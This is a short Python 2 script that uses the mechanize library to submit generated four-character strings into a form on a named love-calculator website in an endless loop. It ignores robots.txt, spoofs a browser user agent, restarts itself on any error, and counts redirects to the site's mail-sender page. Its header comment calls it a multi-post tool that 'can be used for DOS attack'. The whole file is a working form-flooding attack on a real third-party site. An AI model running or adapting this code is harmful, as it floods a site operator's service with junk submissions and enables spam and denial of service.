'''
This program was created to multi post the values into a form
Not to mention can be used for DOS attack
can contact me at : narayanavinaykumar@gmail.com
                    vinay@programmer.net
'''

#! python2
import mechanize 
import itertools
def postme():
    br = mechanize.Browser()
    br.set_handle_equiv(True)
    br.set_handle_redirect(True)
    br.set_handle_referer(True)
    br.set_handle_robots(False)
    #ua = r"'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11','Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8','Accept-Charset': 'ISO-8859-1,utf-8;q=0.7,*;q=0.3','Accept-Encoding': 'none','Accept-Language': 'en-US,en;q=0.8','Connection': 'keep-alive'"
    #br.addheaders = [('User-Agent':ua), ('Accept', '*/*')]
    br.addheaders = [('User-agent', 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1')]
    count = 0
    #combos = itertools.permutations("@@#$$&$&&&&&&%5457)8*())#$%",6)
    s1 = "abcABCDEFGHJKLMNdefghijklmnopqrstuvwxyz1234567890OPQRSTUVWXYZ"
    s2 = s1[::-1]
    try:
        while(1):
            combos = itertools.permutations(s1,4)
            br.open("https://lovecalczone.com/calculate.php?t=xxxxxxx")
            for x in combos:	
                    br.select_form( nr = 0 )
                    br.form['nameField'] =''.join(x)
                    br.form['crushField'] =''.join(x)
                    #print "Checking ",br.form['password']
                    response=br.submit()
                    count=count+1
                    if response.geturl()=="https://lovecalczone.com/mailSender.php":
                            #url to which the page is redirected after login
                            print "Perfecto! " + str(count)
                            br.back();
                            #break
    except:
        postme()
postme()                  
